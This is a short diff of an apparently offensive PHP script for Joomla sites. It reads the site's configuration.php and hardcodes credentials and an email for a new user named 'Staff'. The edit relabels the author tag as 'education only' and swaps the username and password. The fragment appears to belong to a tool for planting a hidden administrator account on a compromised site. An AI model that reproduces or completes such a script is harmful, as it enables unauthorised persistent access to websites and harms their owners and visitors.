@@ -1,12 +1,12 @@
 <?php
-// MODIFIED FOR JOOMLA - GHOSTPELSS
+// MODIFIED FOR JOOMLA - EDUKASI SAJA
 
 // Path ke file configuration.php Joomla
 $config_path = $_SERVER['DOCUMENT_ROOT'] . '/configuration.php';
 
 // Data pengguna baru
-$username = 'zeroings';
-$password = 'Askurm0m#';
+$username = 'zeroing';
+$password = 'Kakekterbang07#';
 $email = 'askurmom007@proton.me';
 $name = 'Staff';
 
